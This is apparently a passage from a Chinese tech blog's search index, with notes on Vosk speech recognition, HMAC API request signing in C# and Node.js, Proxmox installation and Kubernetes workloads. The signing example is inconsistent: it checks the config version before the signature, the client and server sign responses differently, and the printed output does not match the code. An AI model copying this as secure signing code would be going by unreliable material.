核以上服务器级 CPU，内存 128GB+。 DeepSeek-R1-671B：需 64 核以上的服务器集群，内存 512GB+。 ","permalink":"https://qfsyso.github.io/posts/vosk-stt/","summary":"Vosk STT 一、准备环境（Debian） sudo apt update sudo apt install -y python3 python3-pip ffmpeg pip3 install --user vosk 二、下载微型中文模型（≈ 40 MB） wget https://alphacephei.com/vosk/models/vosk-model-small-cn-0.22.zip unzip vosk-model-small-cn-0.22.zip 三、保存以下脚本为 listen.py #!/usr/bin/env python3 import sys, json, os from vosk import Model, KaldiRecognizer import wave MAP = { \u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5 } def wav2text(path): wf = wave.open(path, \u0026#34;rb\u0026#34;) if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频必须是 16 kHz 16-bit 单声道 WAV\u0026#34;) model = Model(\u0026#34;vosk-model-small-cn-0.","title":"Vosk STT"},{"content":"接口签名核心知识点总结 1. ​​核心原理：验证完整性与身份​​ 接口签名（API Signature）是一种通过加密机制确保API请求的​​数据完整性​​和​​来源合法性​​的技术。客户端使用密钥（Secret Key）对请求内容生成签名，服务端用相同密钥和算法重新计算签名并比对，匹配则通过验证。\n2. ​​签名生成的关键步骤​​ ​​参数排序​​：按参数名的ASCII码升序排列（如 a=1\u0026amp;b=2\u0026amp;c=3），确保顺序一致性。 ​​拼接字符串​​：将排序后的参数拼接为待签名字符串（如 key1=value1\u0026amp;key2=value2）。 ​​添加密钥​​：在字符串末尾附加密钥（如 待签名字符串\u0026amp;key=API_SECRET）。 ​​加密生成签名​​：使用算法（如HMAC-SHA256、MD5）生成签名，并附加到请求中。\n3. ​​核心参数设计​​ ​​appid​​：应用标识，与密钥配对使用。 ​​timestamp​​：请求时间戳（推荐UTC时间），服务端验证是否在有效窗口内（如±5分钟）。 ​​nonce​​：唯一随机数，防止重放攻击（需服务端缓存校验）。 ​​signature​​：加密生成的签名值。\n4. ​​常见问题与解决方案​​ ​​签名不一致​​： 原因：参数顺序/编码不一致、密钥错误、时间戳不同步。 解决：统一序列化规则（禁用JSON缩进）、同步UTC时间、校验密钥。 ​​重放攻击​​： 原因：nonce重复使用。 解决：服务端用缓存（如内存缓存）记录已使用的nonce。 ​​时区导致时间戳失效​​： 解决：客户端同步服务端时间（如NTP校准），或服务端放宽时间窗口。\n5. ​​四大安全价值​​ ​​防伪装​​：验证请求来源（依赖密钥保密性）。 ​​防篡改​​：签名变化即提示数据被篡改。 ​​防重放​​：通过nonce和timestamp拦截重复请求。 ​​防泄露​​：敏感参数可加密传输（如结合RSA）。\n6. ​​最佳实践​​ ​​算法选择​​：优先HMAC-SHA256（比MD5更安全）。 ​​密钥管理​​：避免硬编码，使用环境变量或密钥管理系统。 ​​调试工具​​： 客户端/服务端打印签名字符串对比差异。 使用在线工具（如HMAC生成器）交叉验证。\n实战 实现一个API接口， 对客户端请求进行签名验证。\n在C#服务端： 创建一个API控制器（如SignController），包含一个处理请求的Action（如Post）。 在Action中，按照以下步骤进行验证： a. 检查时间戳是否在有效期内（例如5分钟内）。 b. 检查nonce是否在内存缓存中存在，如果存在则拒绝（重放攻击），否则将nonce存入缓存（设置过期时间，例如5分钟）。 c. 验证配置版本号，如果和服务器最新版本一致，则返回304（NotModified）。 d. 重新计算签名，并与请求中的sign比对，如果不一致则返回401。 使用HMAC-SHA256算法计算签名，注意签名生成规则：对请求参数（除sign外）按照键名字典序排序，然后序列化为规范的JSON字符串（确保键的顺序一致），然后使用密钥进行HMAC-SHA256计算。\n具体代码实现如下： C#服务端代码（.NET Core） 创建SignController 使用MemoryCache来存储nonce Node.js测试客户端代码 使用axios发送请求 使用crypto模块计算HMAC-SHA256签名 我们假设服务端的最新配置版本为\u0026quot;1.0.3\u0026quot;（为了测试，可以硬编码，实际中可能从配置文件中读取）。\n错误码： 时间戳过期：401 nonce重复（重放攻击）：403 配置版本一致：304 签名不匹配：401 成功：200\nusing System; using System.Collections.Generic; using System.Linq; using System.Security.Cryptography; using System.Text; using System.Text.Json; using Microsoft.AspNetCore.Mvc; using Microsoft.Extensions.Caching.Memory; [ApiController] [Route(\u0026#34;api/[controller]\u0026#34;)] public class DeviceController : ControllerBase { // 内存缓存实例 private readonly IMemoryCache _cache; // 最新配置版本 private const string LatestConfigVersion = \u0026#34;1.0.3\u0026#34;; // 签名密钥（实际应存储在安全配置中） private const string SecretKey = \u0026#34;your-secret-key-here\u0026#34;; public DeviceController(IMemoryCache memoryCache) { _cache = memoryCache; } [HttpPost(\u0026#34;update\u0026#34;)] public IActionResult UpdateDevice([FromBody] DeviceRequest request) { // 1. 检查时间戳有效期（5分钟内） var currentTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); if (Math.Abs(currentTimestamp - request.Timestamp) \u0026gt; 300) { return Unauthorized(new { code = 401, message = \u0026#34;Timestamp expired\u0026#34; }); } // 2. 检查nonce是否重复 if (_cache.TryGetValue(request.Nonce, out _)) { return StatusCode(403, new { code = 403, message = \u0026#34;Replay attack detected\u0026#34; }); } _cache.Set(request.Nonce, true, TimeSpan.FromMinutes(5)); // 3. 检查配置版本 if (request.ConfigVersion == LatestConfigVersion) { return StatusCode(304, new { code = 304, message = \u0026#34;Config not modified\u0026#34; }); } // 4. 验证签名 var calculatedSign = GenerateSignature(request); if (request.Sign != calculatedSign) { return Unauthorized(new { code = 401, message = \u0026#34;Invalid signature\u0026#34; }); } // 执行业务逻辑 return Ok(new { code = 200, data = new { new_config = \u0026#34;1.0.4\u0026#34;, update_url = \u0026#34;https://example.com/update\u0026#34; }, sign = GenerateResponseSignature(request) // 返回数据签名 }); } // 生成请求签名 private string GenerateSignature(DeviceRequest request) { // 创建有序字典（字典序排序） var sortedDict = new SortedDictionary\u0026lt;string, object\u0026gt; { [\u0026#34;device_id\u0026#34;] = request.DeviceId, [\u0026#34;timestamp\u0026#34;] = request.Timestamp, [\u0026#34;nonce\u0026#34;] = request.Nonce, [\u0026#34;config_version\u0026#34;] = request.ConfigVersion }; // 序列化为规范JSON var json = JsonSerializer.Serialize(sortedDict, new JsonSerializerOptions { WriteIndented = false, Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping }); // HMAC-SHA256计算签名 using (var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(SecretKey))) { byte[] hashBytes = hmac.ComputeHash(Encoding.UTF8.GetBytes(json)); return BitConverter.ToString(hashBytes).Replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;).ToLower(); } } // 生成响应签名 private string GenerateResponseSignature(DeviceRequest request) { // 实际实现应包括响应数据 using (var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(SecretKey))) { byte[] hashBytes = hmac.ComputeHash(Encoding.UTF8.GetBytes(request.DeviceId)); return BitConverter.ToString(hashBytes).Replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;).ToLower(); } } } // 请求模型 public class DeviceRequest { public string DeviceId { get; set; } public long Timestamp { get; set; } public string Nonce { get; set; } public string ConfigVersion { get; set; } public string Sign { get; set; } } 在Node.js客户端测试例子： 构建请求参数，包括device_id, timestamp, nonce, config_version。 按照同样的规则生成签名（字典序排序后生成JSON字符串，然后HMAC-SHA256）。 发送POST请求到服务端，并显示响应。 注意：服务端和客户端需要使用相同的密钥和签名生成算法。\nconst crypto = require(\u0026#39;crypto\u0026#39;); const axios = require(\u0026#39;axios\u0026#39;); // 配置参数 const SECRET_KEY = \u0026#39;your-secret-key-here\u0026#39;; const API_URL = \u0026#39;http://localhost:5000/api/device/update\u0026#39;; // 生成签名 function generateSignature(params) { // 字典序排序 const sortedParams = {}; Object.keys(params).sort().forEach(key =\u0026gt; { sortedParams[key] = params[key]; }); // 生成规范JSON const jsonString = JSON.stringify(sortedParams); // HMAC-SHA256计算签名 const hmac = crypto.createHmac(\u0026#39;sha256\u0026#39;, SECRET_KEY); hmac.update(jsonString); return hmac.digest(\u0026#39;hex\u0026#39;); } // 测试请求 async function testApiRequest() { // 准备请求参数 const requestData = { device_id: \u0026#34;abc123\u0026#34;, timestamp: Math.floor(Date.now() / 1000), nonce: Math.random().toString(36).substring(2, 10), config_version: \u0026#34;1.0.2\u0026#34; }; // 生成签名 requestData.sign = generateSignature(requestData); try { console.log(\u0026#39;Sending request:\u0026#39;, requestData); // 发送请求 const response = await axios.post(API_URL, requestData, { headers: {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} }); // 验证响应签名 if (response.data.sign) { const localSign = generateSignature(response.data.data); const valid = localSign === response.data.sign; console.log(`Response signature valid: ${valid}`); } console.log(\u0026#39;API response:\u0026#39;, response.data); } catch (error) { console.error(\u0026#39;Request failed:\u0026#39;, error.response?.data || error.message); } } // 执行测试 testApiRequest(); 结果 结果\nSending request: { device_id: \u0026#39;abc123\u0026#39;, timestamp: 1751013284, nonce: \u0026#39;ubg7kzul\u0026#39;, config_version: \u0026#39;1.0.2\u0026#39;, sign: \u0026#39;9bbeed3b33cacff9ff65d9903346ba1d1f2856171d05202ad4647e2255eb9a2f\u0026#39; } API response: { isOk: true, code: 1, msg: \u0026#39; ok \u0026#39;, rsData: { version: \u0026#39;1.1.4\u0026#39;, timestamp: 1718872400, ips: [ [Object], [Object], [Object] ], sign: \u0026#39;a42af1681f93f5ca7b7ff95d0194cf416be492fb7e8f969f0c251a3547c8967f\u0026#39; } } 服务端使用缓存 使用.NET缓存\nProgram.cs 中配置 Redis 依赖注入：\nbuilder.Services.AddSingleton\u0026lt;IConnectionMultiplexer\u0026gt;(ConnectionMultiplexer.Connect(\u0026#34;192.168.80.49:6379,abortConnect=false, connectTimeout=5000\u0026#34;)); private readonly IMemoryCache _memoryCache; private readonly IDatabase _redisDb; private static int useRedisCache = 1; // 1=使用Redis，0=使用MemoryCache private const string LatestConfigVersion = \u0026#34;1.0.3\u0026#34;; private const string SecretKey = \u0026#34;your-secret-key-here\u0026#34;; public DataController(IMemoryCache memoryCache, IConnectionMultiplexer redis) { _memoryCache = memoryCache; _redisDb = redis.GetDatabase(); } //... // 2. 检查nonce是否重复 if (useRedisCache == 1) { // 使用 Redis 缓存 if (_redisDb.StringGet(request.Nonce) == \u0026#34;1\u0026#34;) { return StatusCode(403, new { code = 403, message = \u0026#34;Replay attack detected\u0026#34; }); } _redisDb.StringSet(request.Nonce, \u0026#34;1\u0026#34;, TimeSpan.FromMinutes(5)); } else { // 使用 .NET 内存缓存 if (_memoryCache.TryGetValue(request.Nonce, out _)) { return StatusCode(403, new { code = 403, message = \u0026#34;Replay attack detected\u0026#34; }); } _memoryCache.Set(request.Nonce, true, TimeSpan.FromMinutes(5)); } END\n","permalink":"https://qfsyso.github.io/posts/api-signature/","summary":"接口签名核心知识点总结 1. ​​核心原理：验证完整性与身份​​ 接口签名（API Signature）是一种通过加密机制确保API请求的​​数据完整性​​和​​来源合法性​​的技术。客户端使用密钥（Secret Key）对请求内容生成签名，服务端用相同密钥和算法重新计算签名并比对，匹配则通过验证。\n2. ​​签名生成的关键步骤​​ ​​参数排序​​：按参数名的ASCII码升序排列（如 a=1\u0026amp;b=2\u0026amp;c=3），确保顺序一致性。 ​​拼接字符串​​：将排序后的参数拼接为待签名字符串（如 key1=value1\u0026amp;key2=value2）。 ​​添加密钥​​：在字符串末尾附加密钥（如 待签名字符串\u0026amp;key=API_SECRET）。 ​​加密生成签名​​：使用算法（如HMAC-SHA256、MD5）生成签名，并附加到请求中。\n3. ​​核心参数设计​​ ​​appid​​：应用标识，与密钥配对使用。 ​​timestamp​​：请求时间戳（推荐UTC时间），服务端验证是否在有效窗口内（如±5分钟）。 ​​nonce​​：唯一随机数，防止重放攻击（需服务端缓存校验）。 ​​signature​​：加密生成的签名值。\n4. ​​常见问题与解决方案​​ ​​签名不一致​​： 原因：参数顺序/编码不一致、密钥错误、时间戳不同步。 解决：统一序列化规则（禁用JSON缩进）、同步UTC时间、校验密钥。 ​​重放攻击​​： 原因：nonce重复使用。 解决：服务端用缓存（如内存缓存）记录已使用的nonce。 ​​时区导致时间戳失效​​： 解决：客户端同步服务端时间（如NTP校准），或服务端放宽时间窗口。\n5. ​​四大安全价值​​ ​​防伪装​​：验证请求来源（依赖密钥保密性）。 ​​防篡改​​：签名变化即提示数据被篡改。 ​​防重放​​：通过nonce和timestamp拦截重复请求。 ​​防泄露​​：敏感参数可加密传输（如结合RSA）。\n6. ​​最佳实践​​ ​​算法选择​​：优先HMAC-SHA256（比MD5更安全）。 ​​密钥管理​​：避免硬编码，使用环境变量或密钥管理系统。 ​​调试工具​​： 客户端/服务端打印签名字符串对比差异。 使用在线工具（如HMAC生成器）交叉验证。\n实战 实现一个API接口， 对客户端请求进行签名验证。\n在C#服务端： 创建一个API控制器（如SignController），包含一个处理请求的Action（如Post）。 在Action中，按照以下步骤进行验证： a. 检查时间戳是否在有效期内（例如5分钟内）。 b. 检查nonce是否在内存缓存中存在，如果存在则拒绝（重放攻击），否则将nonce存入缓存（设置过期时间，例如5分钟）。 c. 验证配置版本号，如果和服务器最新版本一致，则返回304（NotModified）。 d. 重新计算签名，并与请求中的sign比对，如果不一致则返回401。 使用HMAC-SHA256算法计算签名，注意签名生成规则：对请求参数（除sign外）按照键名字典序排序，然后序列化为规范的JSON字符串（确保键的顺序一致），然后使用密钥进行HMAC-SHA256计算。\n具体代码实现如下： C#服务端代码（.NET Core） 创建SignController 使用MemoryCache来存储nonce Node.js测试客户端代码 使用axios发送请求 使用crypto模块计算HMAC-SHA256签名 我们假设服务端的最新配置版本为\u0026quot;1.0.3\u0026quot;（为了测试，可以硬编码，实际中可能从配置文件中读取）。\n错误码： 时间戳过期：401 nonce重复（重放攻击）：403 配置版本一致：304 签名不匹配：401 成功：200","title":"API Signature"},{"content":"安装 Proxmox VE（PVE）前的准备\n1. 下载 PVE 镜像 访问官网：https://www.proxmox.com/en/downloads\n下载最新版的 Proxmox VE ISO Installer（例如：proxmox-ve_8.x.iso）\n2. 制作启动U盘 使用工具制作启动盘（推荐）：\nVentoy（推荐）：支持多镜像启动，简单拖入 ISO 即可。 官网：https://www.ventoy.net/\n或者使用 Rufus：\n打开 Rufus，插入U盘（建议 8GB 以上）\n选择 ISO 镜像\n分区类型：推荐 MBR（兼容性更好）或根据你 BIOS 设置为 UEFI/GPT\n点击“开始”制作启动盘\n安装 PVE 设置 BIOS 启动项 插入U盘，重启电脑\n在开机画面按下启动快捷键（如 F12, Esc, F2, Del，不同厂商略有不同）\n选择从 U盘启动\n安装 启动后选择 Install Proxmox VE\n阅读并接受许可协议\n选择硬盘（注意：会格式化此硬盘）\n设置地区、时区和键盘布局\n设置管理员密码与邮箱\n设置管理 IP（如默认DHCP，建议改为静态IP以方便局域网访问）\n等待安装完成\n安装完成后 安装完成后，拔掉U盘并重启\n启动后，系统会提示你使用浏览器访问管理界面：\nhttps://ip-address:8006 注意：此为 https，浏览器会提示不安全连接，选择“继续前往”即可\n使用建议 推荐使用 局域网静态 IP，便于访问和远程管理\n可以创建 VM、LXC 容器，安装 Windows、Ubuntu 等系统\n支持磁盘直通、PCIe 直通（适合黑群晖、软路由等）\n注意事项 安装后 原 Windows 系统将被完全清除\nPVE 是面向服务器的操作系统，无图形桌面\n若你只是想在 Windows 上体验 PVE，可以考虑 使用虚拟机（如 VirtualBox、VMware）测试安装 PVE\n先安装debian再pve 1. 修改 sources.list 加入 PVE 仓库 echo \u0026#34;deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription\u0026#34; | sudo tee /etc/apt/sources.list.d/pve-install-repo.list 2. 添加密钥 wget https://enterprise.proxmox.com/debian/proxmox-release-bookworm.gpg -O- | sudo gpg --dearmor -o /usr/share/keyrings/proxmox-archive-keyring.gpg 3. 更新软件源 sudo apt update 4. 安装 PVE 环境 sudo apt install proxmox-ve postfix open-iscsi -y 5. 重启系统 sudo reboot Debian12 setup debian安装教程 https://www.cnblogs.com/fengdongd/p/18783298\nDeiban suspend /etc/systemd/logind.conf\nIdleAction = ignore\n","permalink":"https://qfsyso.github.io/posts/proxmox-virtual-environment-debian/","summary":"安装 Proxmox VE（PVE）前的准备\n1. 下载 PVE 镜像 访问官网：https://www.proxmox.com/en/downloads\n下载最新版的 Proxmox VE ISO Installer（例如：proxmox-ve_8.x.iso）\n2. 制作启动U盘 使用工具制作启动盘（推荐）：\nVentoy（推荐）：支持多镜像启动，简单拖入 ISO 即可。 官网：https://www.ventoy.net/\n或者使用 Rufus：\n打开 Rufus，插入U盘（建议 8GB 以上）\n选择 ISO 镜像\n分区类型：推荐 MBR（兼容性更好）或根据你 BIOS 设置为 UEFI/GPT\n点击“开始”制作启动盘\n安装 PVE 设置 BIOS 启动项 插入U盘，重启电脑\n在开机画面按下启动快捷键（如 F12, Esc, F2, Del，不同厂商略有不同）\n选择从 U盘启动\n安装 启动后选择 Install Proxmox VE\n阅读并接受许可协议\n选择硬盘（注意：会格式化此硬盘）\n设置地区、时区和键盘布局\n设置管理员密码与邮箱\n设置管理 IP（如默认DHCP，建议改为静态IP以方便局域网访问）\n等待安装完成\n安装完成后 安装完成后，拔掉U盘并重启\n启动后，系统会提示你使用浏览器访问管理界面：\nhttps://ip-address:8006 注意：此为 https，浏览器会提示不安全连接，选择“继续前往”即可\n使用建议 推荐使用 局域网静态 IP，便于访问和远程管理","title":"Proxmox Virtual Environment Debian"},{"content":"Kubernetes k8s 描述什么是Kubernetes 描述Kubernetes的基本架构及核心概念 描述Kubernetes的应用编排方法 使用华为云CCE创建简单工作负载\n容器编排技术 容器（如Docker）以及周边生态系统提供了很多工具来实现容器生命周期管理，能够满足在单台宿主机管理容器的需求。但越来越多企业开始使用容器，对容器技术的进一步发展提出了以下新的诉求： □高效的容器管理及编排。 □容器的跨主机部署及调度。 □容器的存储、网络、运维、安全等能力的拓展。 统一的容器编排管理工具\n容器编排的价值 容器编排是指自动化容器的部署、管理、扩展和联网，可为企业带来以下价值： 灵活的资源管理及调度 自动化部署及服务发现 高效的监控及运维 弹性扩展及高可用\n大规模容器集群管理工具，从Borg到Kubernetes ·Kubernetes起源于Google内部的Borg项目，它对计算资源进行了更高层次的抽象，通过将容器进行细致的组合，将最终的应用服务交给用户。它的目标是管理大规模的容器，提供基本的部署、维护以及应用伸缩等功能，其主要实现语言为Go语言。 ·Kubernetes作为容器集群管理工具，于2015年7月22日迭代到v1.0并正式对外公布。与此同时，谷歌联合Linux基金会及其他合作伙伴共同成立了CNCF基金会（CloudNativeComputingFoundation），并将Kuberentes作为首个编入CNCF管理体系的开源项目，助力容器技术生态的发展进步。\nKubernetes架构 ·一个基础的Kubernetes集群（Cluster）通常包含一个Master节点和多个Node节点。每个节点可以是一台物理机，也可以是一台虚拟机。\npod最小容器（container）\nKubernetes核心概念-Pod Pod是Kubernetes中最重要最基本的概念，Pod是Kubernetes最小工作单元。每一个Pod包含一个或多个相关容器，Kubernetes将Pod看做一个整体进行调度。 引入Pod的目的： 将联系紧密的容器封装在一个Pod单元内，以Pod整体进行调度、扩展和实现生命周期管理。 Pod内所有容器使用相同的网络Namespace和共享存储。即Pod内容器拥有相同IP地址和Port空间，容器间直接使用localhost通信。当挂载volume到Pod，即可实现将volume挂载到Pod中的每个容器。\nKubernetes核心概念-Controller ·工作负载是在Pod之上的一层抽象，我们可以通过控制器（controller）实现一系列基于Pod的高级特性，比如节点故障时Pod的自动迁移，Pod多副本横向扩展，应用滚动升级等。我们通常使用controller来做应用的真正的管理，而Pod是组成工作负载最小的单元\nKubernetes核心概念-Label ·当资源变得非常多的时候，如何分类管理就非常重要了，Kubernetes提供了一种机制来为资源分类，那就是Label（标签）。Label非常简单，但是却很强大，Kubernetes中几乎所有资源都可以用Label来组织。Label的具体形式是key-value的标记对，可以在创建资源的时候设置，也可以在后期添加和修改。\nKubernetes核心概念-Namespace ·命名空间（Namespace）是对一组资源和对象的抽象整合。在同一个集群内可创建不同的命名空间，不同命名空间中的数据彼此隔离。使得它们既可以共享同一个集群的服务，也能够互不干扰。 kube-public kube-system kube-node-lease default\nKubernetes核心概念-Service ·在Kubernetes中，Pod副本发生迁移或者伸缩的时候会发生变化，IP也是变化的。Kubernetes中的Service是一种抽象概念，它定义了一个Pod逻辑集合以及访问它们的策略。Service定义了外界访问一组特定Pod的方式。Service有自己的IP和端口，Service为Pod提供了负载均衡。\nKubernetes核心概念-Volume ·Volume用来管理Kubernetes存储，是用来声明在Pod中的容器可以访问的文件目录，含义如下： 声明在Pod中的容器可以访问的文件目录。 可以被挂载在Pod中一个或多个容器的指定路径下。 支持多种后端存储（本地存储、分布式存储、云存储等）。\nKubernetes管理-Kubectl ·Kubectl是Kubernetes的命令行工具。通过kubectl，用户能对集群进行管理，并在集群上进行容器化应用的安装部署。\nKubectl支持以下对象管理方式： 指令式：通过kubectl内置的驱动命令，如:kubectl +create/scale/delete/..+参数的形式， 直接快速创建、更新和删除Kubernetes对象。\n声明式：使用kubectlapply创建指定目录中配置文件所定义的所有对象。通常，此配置文件 采用yaml进行描述。\nKubernetes管理-命令行语法 在Kubernetes中的很多操作都是用kubectl来完成，通过其命令可以管理Deployment、Replicaset、ReplicationController、Pod等，进行操作、扩容、删除等全生命周期操作，同时可以对管理对象进行查看或者监控资源使用情况。\nkubectl的语法\nkubectl [command] [TYPElNAME] [flags] Command：指定你希望进行的操作，如create，get，describe，delete等。 TYPE：指定操作对象的类型，如deployment，pod，service等。 hiPnNAME：指定对象的名字。hidhwyun flags:可选的标志位。\nKubernetes管理-yaml示例 ·kubernetes中的对象可以使用YAML描述（如果您对YAML格式不了解，可以参考YAML语法少，也可以使用JSON。其内容可以分为如下四个部分： typeMeta：对象类型的元信息，声明对象使用哪个API版本，哪个类型的对象。 objectMeta：对象的元信息，包括对象名称、使用的标签等。 spec：对象的期望状态，例如对象使用什么镜像、有多少副本等。 status：对象的实际状态，只能在对象创建后看到，创建对象时无需指定。\napiVersion: apps/v1 kind: Deployment metadata: name: nginx labels: app: nginx spec: selector: matchLabels: app: nginx replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:alpine resources: requests: cpu: 100m memory: 200Mi limits: cpu: 100m memory: 200Mi imagePullSecrets: - name: default-secret status: {} Kubernetes应用编排-工作负载类型 无状态工作负载：管理的Pod集合是相互等价的，需要的时候可以被替换。 Deployment ReplicaSet\n有状态工作负载：为每个Pod维护了一个唯一的ID，能够保证Pod的顺序性和唯一性，每个Pod是不 可替代的。可使用持久存储来保存服务产生的状态。 StatefulSet\n守护进程工作负载：保证每个节点上运行着这样一个守护进程。 DaemonSet\n批处理工作负载：一次性的任务 Job CronJob 事件调度\nDeployment概述 Deployment是一组不具有唯一标识的多个Pod的集合。一个Deployment可以包含一个或多个Pod副本，每个Pod副本的角色相同，通过Service为Deployment的多个Pod副本分发请求。 Deployment具备以下功能: 确保集群中有期望数量的Pod运行。 提供多种升级策略以及一键回滚能力。 提供暂停/恢复的能力。\n典型使用场景： WebServer等无状态应用。\n特征： 在Deployment中，所有Pod地位都是平等的，当一个Pod因故障被替换后，新的容器与其余所有Pod依然相同，因此无论请求发送到哪个Pod，返回的结果都是一致的。或者 Pod被删除后，里面的数据也随之消失。这种特性一般称其为“无状态”。\nDeployment管理-使用命令行创建Deployment 创建一个简单的deployment:\nkubectl create deployment mydep--image=nginx --replicas=3 使用如下语句查看deployment的创建情况：\nkubectl get deployment 回显 NAME\tREADY\tUP-TO-DATE\tAVAILABLE\tAGE mydep\t1/1\t1\t1\t2m3s\nDeployment管理-使用yaml创建Deployment （更多） 创建一个yaml文件：\nvi nginx.yaml 从yaml文件创建deployment:\nkubectl apply -f nginx.yaml 查看创建结果：\nkubectl get deployment Deployment管理-副本管理 ·扩容/缩容Deployment指增加或减少它的副本数。最 简单的方式是更新其yaml中的replicas字段。 ·Deployment的副本机制是通过ReplicaSet实现的。\nDeployment管理-应用升级 ·在实际应用中，升级是一个常见的场景，Deployment能够很方便的支撑应用升级。 Deployment可以设置不同的升级策略，有如下两种。 RollingUpdate：滚动升级，即逐步创建新Pod再删除日Pod，为默认策略。 Recreate：替换升级，即先把当前Pod删掉再重新创建Pod。\nDeployment的升级方式：\nkubectl edit deploy/nginx kubectl set image deploy/nginx nginx=nginx:1.9.1 kubectl apply -f nginx.yaml 查看Deployment滚动更新情况/历史:\nkubectl rollout status deploy/nginx kubectl rollout history deploy/nginx 修改完成后再查询ReplicaSet和Pod，发现创建了一个新的ReplicaSet，Pod也重新创建了。\nDeployment管理-应用回滚 ·回滚也称为回退，即当发现升级出现问题时，让应用回到老的版本。Deployment可以非常方便的回滚到老版本。 Deployment回滚：\nkubectl rollout undo deployment/nginx --to-revision=2 #不指定的话默认回滚到上一个版本 Deployment之所以能如此容易的做到回滚，是因为Deployment是通过ReplicaSet控制Pod的，升级后先前的ReplicaSet仍然存在，Deployment回滚做的就是使用之前的ReplicaSet再次把Pod创建出来。\nStatefulSet-创建有状态应用 创建HeadlessService，服务没有固定IP，通过DNS可以将请求直接发送至Pod。 创建StatefulSet，用于有序的Pod管理。 PVC用于提供稳定持久的存储。如果后端用动态方式可以不用预先创建PV，否则需要在准备阶段完成PV创建工作。\nStatefulSet-创建Headless服务 ·创建Headless服务需注意以下几点： 服务名称和StatefulSet中的定义一致; 选择器要指向正确的Pod标签； 指定clusterIP：None。 …创建步骤： □编辑headless.yaml，创建Headless Service:\n$ vi headless.yaml $ kubectl create -f headless.yaml 查询Service:\n$ kubectl get svc apiVersion: v1 kind: Service metadata: name: nginx labels: app: nginx spec: ports: - name: nginx port: 80 selector: app: nginx clusterIP: None hidhw StatefulSet-创建StatefulSet(1)\n·创建一个yaml文件，后从yaml文件创建StatefulSet:\nvi web.yaml kubectl apply -f web.yaml idhwjen创建完成后，可看到Pod名称按序号排序：\nkubectl get pod apiVersion: apps/v1 kind: StatefulSet metadata: name: web spec: # 保持原有内容不变... template: # 保持原有内容不变... volumeClaimTemplates: - metadata: name: www annotations: everest.io/disk-volume-type: SAS spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi storageClassName: csi-disk 后台已创建三个PVC，名称相同，以序号排序，依次和PV做绑定\nkubectl get PVC 使用nslookup查看DNS记录，可以看到对该服务的访问直接指向Pod\nStatefulSet-副本管理 ·扩容/缩容StatefulSet指增加或减少它的副本数。这可以 通过更新replicas字段完成。 当缩容StatefulSet时，可以看到Pod停止的顺序为从序号最高的开始降序终止，并且只有在前一个pod被完全终止后，下一个才开始终止。升级时，也是以相同顺序处理。 StatefulSet的副本管理由StatefulSet控制器实现的。这一点可通过查看对应Pod的ownerReference字段查看。\nDaemonSet概述 ·DaemonSet是这样一种对象（守护进程），它在集群的每个节点上运行个Pod，且保证只有一个Pod，“这非常适合一些系统层面的应 用，例如日志收集、资源监控等，这类应用需要每个节点都运行，且不需要太多实例，一个比较好的例子就是Kubernetes的kube-proxy。 DaemonSet跟节点相关,“如果节点异常，也不会在其他节点重新创建。它具备以下特点： 确保每一个节点或者期望的节点（通过nodeSelector实现）上运行一个Pod。 新增节点时自动部署一个Pod。 移除节点时自动删除Pod。\nDaemonSet管理-创建DaemonSet ·通过yaml创建DaemonSet的方式与创建Deployment的方式相似，区别在于： □kind选择DaemonSet。不需要规定replicas项。 DaemonSet创建完成后可以在Node1和Node2上分别看到一个pod:\nkubectl get pod -o wide apiVersion: apps/v1 kind: DaemonSet metadata: name: nginx-daemonset spec: selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 DaemonSet管理-使用DaemonSet 如将其中一个pod强制删除，DaemonSet会自动启动一个新的pod\nJobs概述 ·Jobs主要处理一些短暂的一次性任务，并具备以下特点\n保证指定数量Pod成功运行结束。 支持并发执行。 支持错误自动重试。 支持暂停/恢复Jobs。\n·典型使用场景： 计算以及训练任务，如批量计算，A训练任务等。\nCronJob概述 ·CronJob主要处理周期性或者重复性的任务： 基于Crontab格式的时间调度。\n可以暂停/恢复CronJob。 ·典型的使用场景： 周期性的数据分析服务。 口周期性的资源回收服务。\nJob-创建Job ·Job执行一次性任务： kind：选择Job。 completions：当前的任务需要执行的Pod数量。 parallelism：表示最多有多少个并发执行的任务。 restartPolicy:只能选择Never或OnFailure。 backoffLimit：参数指定job失败后进行重试的次数。\napiVersion: batch/v1 kind: Job metadata: name: pi spec: completions: 1 parallelism: 1 template: spec: containers: - name: pi image: perl:latest command: [\u0026#34;perl\u0026#34;, \u0026#34;-Mbignum=bpi\u0026#34;, \u0026#34;-wle\u0026#34;, \u0026#34;print bpi(2000)\u0026#34;] restartPolicy: OnFailure backoffLimit: 4 kubectl get job CronoJob管理-创建CronJob ·CronJob是一种特殊的Job，它能够按照时间对任 务进行调度，与我们熟悉的crontab非常相似。 我们可以使用Cron格式快速指定任务的调度时间： 在给定时间点只运行一次。 在给定时间点周期性地运行。 min\thour\tday\tmonth\tdayofweek\napiVersion: batch/v1beta1 kind: CronJob metadata: name: pi spec: schedule: \u0026#34;*/1 * * * *\u0026#34; jobTemplate: spec: completions: 3 parallelism: 1 template: spec: containers: - name: pi image: perl command: [\u0026#34;perl\u0026#34;, \u0026#34;-Mbignum=bpi\u0026#34;, \u0026#34;-wle\u0026#34;, \u0026#34;print bpi(2000)\u0026#34;] restartPolicy: OnFailure kubectl get cronjob --watch kubectl get job --watch 云容器引|擎（Cloud Container Engine，简称CCE） CCE集群：丰富异构、高性能、安全、统一调度的容器基础设施产品\n可以通过CCE控制台、Kubectl命令行、KubernetesAPI使用云容器引l擎服务。\n使用IAM账号需要授权\n创建集群 CCE集群 Turbo集群 鯤鹏集群\n部署工作负载 